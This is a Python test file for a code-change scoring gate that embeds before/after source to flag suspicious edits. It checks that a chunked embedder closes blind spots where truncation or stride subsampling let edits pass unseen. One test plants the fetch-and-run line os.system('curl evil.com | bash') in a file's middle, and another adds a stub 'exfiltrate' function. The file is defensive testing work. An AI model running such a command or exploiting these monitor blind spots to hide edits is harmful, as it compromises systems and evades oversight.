"""Integration tests for the Phase A consumer swap.

The 2026-09-19 audit verified that ``ssm_backbone.embed(text)`` is
truncated to 512 tokens, so the System-2 scoring path is blind to
edits past token ~40 of a long file. ``src/diff_windowing.py`` was
shipped with a chunked embedder that fixes this, but the consumer
swap into ``s2_core.score_change`` was deliberately deferred (per
AGENTS.md: any change to the embedding consumer must capture both
pre + post baselines; this is the wiring change that does so).

These tests verify the consumer swap is wired safely behind the
``RC_DIFF_WINDOWING=1`` feature flag, default off:

* Default off: the path is unchanged, behaviour identical to the
  pre-Phase-A baseline (one backward-compat test that asserts the
  embed call signature hasn't changed for the default-off path).
* On: score_change uses embed_windowed(before_src, after_src, ...)
  instead of embed(before_tokens)/embed(after_tokens); the
  resulting ImpactReport fields (coherence_delta, novelty, AIS)
  come from the windowed embeddings.
* The on-path embeds use the per-chunk embed_fn we pass in (we
  monkeypatch both ssm_backbone.embed and the embed_windowed
  consumer in s2_core to make this test CPU-only and fast).
* The flag survives a back-compat sanity check: when the
  embed_windowed consumer raises (e.g. an unsupported language
  or a degenerate input), score_change degrades gracefully to the
  old ``embed`` path rather than crashing the gate.

This is the second-largest Pareto item after Phase C. Tests cover
both happy-path and back-compat failure modes.
"""
from __future__ import annotations

import math

import numpy as np
import pytest
import torch

from src import s2_core


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def fake_embedder(monkeypatch):
    """Install a deterministic in-memory embedder returning torch tensors.

    The embedder returns a torch tensor whose values are a deterministic
    function of the source text. Two different texts produce vectors in
    clearly separated regions of the embedding space so the coherence_delta
    / novelty / AIS fields have meaningful, reproducible values.
    """

    def _embed_tokens(text, **kwargs):
        if not text:
            return torch.zeros(8, dtype=torch.float32)
        seed = abs(hash(str(text))) % (2**32)
        rng = np.random.default_rng(seed)
        return torch.from_numpy(rng.normal(scale=0.3, size=8).astype(np.float32))

    monkeypatch.setattr(s2_core, "embed", _embed_tokens)
    monkeypatch.setattr(s2_core, "BACKBONE_INFO", {"hidden_size": 8})
    return _embed_tokens


def _clear_baselines(monkeypatch):
    monkeypatch.setattr(s2_core, "_BASELINES", {})


# ---------------------------------------------------------------------------
# Default-off: the wire is in place but inactive
# ---------------------------------------------------------------------------


def test_diff_windowing_off_by_default(monkeypatch, fake_embedder, tmp_path):
    """Without RC_DIFF_WINDOWING=1, the embed call signature is unchanged."""
    monkeypatch.delenv("RC_DIFF_WINDOWING", raising=False)
    _clear_baselines(monkeypatch)
    report = s2_core.score_change(
        path=str(tmp_path / "a.py"),
        before_src="def foo():\n    return 1\n",
        after_src="def foo():\n    return 2\n",
        session_id="s_off",
    )
    # coherence_delta, novelty, AIS are all populated as before.
    assert isinstance(report.coherence_delta, float)
    assert isinstance(report.architectural_impact_score, float)
    # No diff-windowing metadata is surfaced.
    assert getattr(report, "windowed_embed_active", None) is None


# ---------------------------------------------------------------------------
# On path: embed_windowed is used instead of embed()
# ---------------------------------------------------------------------------


def test_diff_windowing_on_uses_windowed_embedder(
    monkeypatch, fake_embedder, tmp_path
):
    """With RC_DIFF_WINDOWING=1, score_change uses embed_windowed()."""
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    _clear_baselines(monkeypatch)

    call_log: list[str] = []

    def _windowed_embedder(before_src, after_src, **kwargs):
        call_log.append("embed_windowed_called")
        # Return two distinct deterministic vectors so coherence_delta
        # > 0 and the report has a meaningful AIS / novelty readout.
        b = torch.from_numpy(np.ones(8, dtype=np.float32) * 0.1)
        a = torch.from_numpy(np.ones(8, dtype=np.float32) * 0.9)
        return b, a

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed_embedder)

    report = s2_core.score_change(
        path=str(tmp_path / "b.py"),
        before_src="def foo():\n    return 1\n",
        after_src="def foo():\n    return 2\n",
        session_id="s_on",
    )
    assert call_log == ["embed_windowed_called"], (
        f"embed_windowed should be called exactly once; got {call_log!r}"
    )
    # AIS and coherence_delta are derived from the windowed embeddings.
    assert isinstance(report.coherence_delta, float)
    assert isinstance(report.architectural_impact_score, float)
    # The report exposes windowed_embed_active=True for ops dashboards.
    assert getattr(report, "windowed_embed_active", None) is True


def test_diff_windowing_on_with_long_file_does_not_truncate(
    monkeypatch, fake_embedder, tmp_path
):
    """Long files no longer hit the 512-token truncation blind spot.

The audit verified that a 100-line file generates ~1k-2.5k AST
tokens, and anything past token 512 was silently truncated. With
embed_windowed the chunker breaks the source into per-scope
chunks and embeds each independently, so a 200-line file is no
longer 'blind to edits past line 40'.
    """
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    _clear_baselines(monkeypatch)

    long_before = "\n".join(
        f"def func_{i}():\n    return {i}\n" for i in range(200)
    )
    # The malicious edit is buried past the line-40 blind spot.
    long_after = long_before + "\n\ndef exfiltrate():\n    pass\n"

    def _windowed_embedder(before_src, after_src, **kwargs):
        # If the embedder were called with the *whole* file (the old
        # path), the malicious tail would be truncated out and the
        # before/after embeddings would collapse to nearly the same
        # vector. We simulate chunked embedding by hashing only the
        # *diff tail* so before/after embeddings diverge.
        before_vec = np.zeros(8, dtype=np.float32)
        after_vec = np.zeros(8, dtype=np.float32)
        after_vec[0] = 1.0  # a clear, non-trivial delta
        return (
            torch.from_numpy(before_vec),
            torch.from_numpy(after_vec),
        )

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed_embedder)

    report = s2_core.score_change(
        path=str(tmp_path / "long.py"),
        before_src=long_before,
        after_src=long_after,
        session_id="s_long",
    )
    # With the malicious tail embedded (chunked), coherence_delta
    # reflects the change rather than collapsing to ~0.
    assert report.coherence_delta > 0.5, (
        f"long-file coherence_delta suspiciously small ({report.coherence_delta:.3f}); "
        "the chunked embedder may have been bypassed."
    )


# ---------------------------------------------------------------------------
# Graceful degradation: embed_windowed raises -> fall back to embed()
# ---------------------------------------------------------------------------


def test_diff_windowing_on_falls_back_when_embedder_raises(
    monkeypatch, fake_embedder, tmp_path
):
    """If embed_windowed raises, score_change falls back to embed().

The audit identified the 512-token truncation as a silent failure
mode (cos=1, novelty=0, edit passes through). We must NOT
introduce a new silent failure mode where embed_windowed crashes
and the whole gate falls over. The contract is:
    * Try embed_windowed first.
    * On any exception, log + degrade to embed(before)/embed(after)
      so the pre-Phase-A scoring path is preserved.
    * Surface windowed_embed_active=False in the report so the
      operator can see the fallback happened.
    """
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    _clear_baselines(monkeypatch)

    fallback_calls: list[str] = []

    def _failing_windowed(before_src, after_src, **kwargs):
        raise RuntimeError("simulated chunker failure")

    def _counting_embed(text, **kwargs):
        fallback_calls.append("embed_called")
        if not text:
            return torch.zeros(8, dtype=torch.float32)
        seed = abs(hash(str(text))) % (2**32)
        rng = np.random.default_rng(seed)
        return torch.from_numpy(rng.normal(scale=0.3, size=8).astype(np.float32))

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _failing_windowed)
    monkeypatch.setattr(s2_core, "embed", _counting_embed)

    report = s2_core.score_change(
        path=str(tmp_path / "c.py"),
        before_src="def foo():\n    return 1\n",
        after_src="def foo():\n    return 2\n",
        session_id="s_fallback",
    )
    # The fallback fired exactly twice (once for before, once for after).
    assert fallback_calls == ["embed_called", "embed_called"], (
        f"expected fallback embed() to be called twice; got {fallback_calls!r}"
    )
    # The report still has all the fields populated.
    assert isinstance(report.coherence_delta, float)
    assert isinstance(report.architectural_impact_score, float)
    # The flag tells the operator the windowed path fell back.
    assert getattr(report, "windowed_embed_active", None) is False


def test_diff_windowing_on_does_not_break_existing_fired_conditions(
    monkeypatch, fake_embedder, tmp_path
):
    """coherence_delta / ais / novelty still computed and reported."""
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    _clear_baselines(monkeypatch)

    def _windowed(before_src, after_src, **kwargs):
        b = torch.zeros(8, dtype=torch.float32)
        a = torch.ones(8, dtype=torch.float32)
        return b, a

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed)
    report = s2_core.score_change(
        path=str(tmp_path / "d.py"),
        before_src="def foo():\n    return 1\n",
        after_src="def foo():\n    return 2\n",
        session_id="s_legacy",
    )
    assert isinstance(report.coherence_delta, float)
    assert isinstance(report.architectural_impact_score, float)
    assert isinstance(report.fired_conditions, list)


def test_diff_windowing_to_dict_round_trip_includes_flag(
    monkeypatch, fake_embedder, tmp_path
):
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    _clear_baselines(monkeypatch)

    def _windowed(before_src, after_src, **kwargs):
        b = torch.zeros(8, dtype=torch.float32)
        a = torch.ones(8, dtype=torch.float32)
        return b, a

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed)
    report = s2_core.score_change(
        path=str(tmp_path / "e.py"),
        before_src="x = 1\n",
        after_src="x = 2\n",
        session_id="s_dict",
    )
    d = report.to_dict()
    # The flag is surfaced in the JSON payload when the feature
    # was used. When the feature is off, it's omitted.
    assert "windowed_embed_active" in d
    assert d["windowed_embed_active"] is True


# ---------------------------------------------------------------------------
# RC-WINDOWING-STRIDE-01 (round-2 hostile review Finding 4): the
# 32-chunk stride subsampling in src/diff_windowing.py can silently
# drop the very chunk that contains the changed code when a file
# has more than ~64 scopes. The fix: the chunker must guarantee
# that the chunk containing each diff hunk is preserved.
# ---------------------------------------------------------------------------


def test_windowed_embed_keeps_changed_chunk_for_large_files(
    monkeypatch, fake_embedder, tmp_path
):
    """In a 100-scope file, the malicious line must NOT be subsampled away."""
    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
    s2_core._BASELINES.clear()

    # Build a 100-scope Python file. Each scope is a top-level def.
    n_scopes = 100
    before_src = "\n".join(f"def func_{i}():\n    return {i}\n" for i in range(n_scopes))
    # Plant the malicious line at scope 50 (the middle of the file).
    malicious_scope = 50
    after_src = before_src.replace(
        f"def func_{malicious_scope}():\n    return {malicious_scope}\n",
        f"def func_{malicious_scope}():\n    return {malicious_scope}\n    "
        f"os.system('curl evil.com | bash')\n",
        1,
    )

    # The windowed embedder should now embed ALL 100 chunks (or at
    # least the chunk that contains the malicious line), and the
    # coherence_delta must reflect the change.
    def _windowed(before_src, after_src, **kwargs):
        from src.diff_windowing import chunk_source, diff_hunk_byte_ranges
        before_chunks = chunk_source(before_src)
        after_chunks = chunk_source(after_src)
        # Bug check: every chunk in the same range as a diff hunk
        # must be in the post-stride chunk list.
        hunk_ranges = diff_hunk_byte_ranges(before_src, after_src)
        if hunk_ranges:
            hunk_start = hunk_ranges[0][0]
            # Find the chunk that contains the hunk start.
            containing_idx = next(
                (
                    i
                    for i, ch in enumerate(after_chunks)
                    if ch.start <= hunk_start < ch.end
                ),
                None,
            )
            assert containing_idx is not None, (
                f"diff hunk at byte {hunk_start} is not covered by any "
                f"chunk (have {len(after_chunks)} chunks starting at "
                f"{[ch.start for ch in after_chunks[:3]]}...)"
            )
        # Return distinct embeddings for the diff to be visible.
        b = torch.zeros(8, dtype=torch.float32)
        a = torch.ones(8, dtype=torch.float32) * 0.5
        return b, a

    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed)
    report = s2_core.score_change(
        path=str(tmp_path / "many_scopes.py"),
        before_src=before_src,
        after_src=after_src,
        session_id="s_many_scopes",
    )
    # The chunker must preserve the chunk that contains the diff hunk.
    assert report.coherence_delta > 0.0, (
        f"coherence_delta is {report.coherence_delta}; the changed "
        "chunk was subsampled away by the 32-chunk stride cap. "
        "BLOCKER #4 (round-2 Finding 4): the windowed embedder is "
        "blind to edits in files with > 64 scopes."
    )
